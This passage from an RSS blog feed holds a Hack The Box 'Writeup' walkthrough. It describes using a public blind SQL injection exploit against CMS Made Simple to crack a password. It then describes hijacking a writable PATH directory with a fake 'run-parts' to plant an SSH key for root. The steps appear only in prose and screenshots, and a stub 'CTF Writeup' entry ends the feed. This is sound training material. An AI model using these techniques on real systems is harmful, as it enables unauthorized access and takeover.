&lt;p&gt;Navigating to /writeup shows a home page with writeups for other retired boxes:
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture4.PNG&quot; alt=&quot;&quot; height=&quot;90%&quot; width=&quot;90%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Using wappalyzer, it showed that this webpage was running “CMS Made Simple”. Wappalyzer is a useful extension (available for chrome and firefox) which shows what various services, languages, operating system the current website is running.
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture5.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A bit of googling on “CMS Made Simple” showed an &lt;a href=&quot;https://www.exploit-db.com/exploits/46635&quot;&gt;SQL Injection vulnerability&lt;/a&gt;, specifically a blind, time-based injection. Essentially what this means is that we don’t recieve any direct output from the injection (blind), so we have to use sleep functionality (time-based) in SQL along with the substring function to determine the trueness of each guess. Through this, we are able to determine valuable information stored on the machine’s database, including the Password hash, the salt for the password, the username, and the email related to that user. With this, we can crack the hash using either hashcat or johntheripper and a common wordlist (rockyou.txt), but luckily the exploit found on exploitdb does this all for us. All we have to do is specify the url (http://10.10.10.138/writeup) and the wordlist to use.
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture6.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We now have the username and password for the user “jkr”. We can SSH in and get the user.txt flag.
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture7.PNG&quot; alt=&quot;&quot; height=&quot;75%&quot; width=&quot;75%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;getting-root&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Getting Root&lt;/h2&gt;

&lt;p&gt;A common script I like to run on any linux box is “pspy”, which shows processes and commands being run in real time. This is useful to see if anything weird is being triggered by doing certain tasks. I used scp to transfer the pspy script over and ran it in one tab. I then opened another SSH connection in another tab to start hopefully triggering some events. Luckily, it was quite easy to find the right event to trigger, since actually SSHing into the box triggered some interesting commands.
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture8.PNG&quot; alt=&quot;&quot; height=&quot;100%&quot; width=&quot;100%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It’s running a command called “run-parts” but it’s specifying it’s own $PATH environment variable. Well let’s check what groups our user is in and what permissions it has on some of these paths:
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture9.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see we are in the “staff” group and staff has write permissions on “/usr/local/sbin”, which is the first path specified in the $PATH variable that we saw. Because of this, we can create our own “run-parts” file, have it do whatever we want, place it in /usr/local/sbin and our file will be executed instead of the expected one. This is because Unix will go down the list of the $PATH environment variable until it hits a match. This is what my “run-parts” file looks like:
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture12.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Through a little troubleshooting of my own, I was able to figure out that the /root directory didn’t have a .ssh directory, which is why I had it make one in my run-parts file. I then copied by public SSH key over into the root’s authorized_keys file and bam, I can now SSH in as root:
&lt;img src=&quot;/assets/2020-5-23-HTB-Writeup/Capture11.PNG&quot; alt=&quot;&quot; height=&quot;60%&quot; width=&quot;60%&quot; style=&quot;display: block;  margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Overall, this is a really good beginner box, as it points out some common web attacks and enumerations (checking robots.txt and SQL Injection). The priv esc was also a good starter as it points out a simple, yet common vulnerability, which is allowing paths in $PATH to be writable by unauthorized users.&lt;/p&gt;

&lt;p&gt;Hope you enjoyed and learned something :)&lt;/p&gt;
</description>
        <pubDate>Sat, 23 May 2020 00:00:00 +0000</pubDate>
        <link>//posts/HTB-Writeup/</link>
        <link href="/posts/HTB-Writeup/"/>
        <guid isPermaLink="true">/posts/HTB-Writeup/</guid>
      </item>
    
      <item>
        <title>CTF Writeup</title>
        <description>&lt;p&gt;This is a CTF Writeup&lt;/p&gt;
</description>
        <pubDate>Sat, 23 May 2020 00:00:00 +0000</pubDate>
        <link>//posts/CTF-XSS/</link>
        <link href="/posts/CTF-XSS/"/>
        <guid isPermaLink="true">/posts/CTF-XSS/</guid>
      </item>
    
  </channel>
</rss>
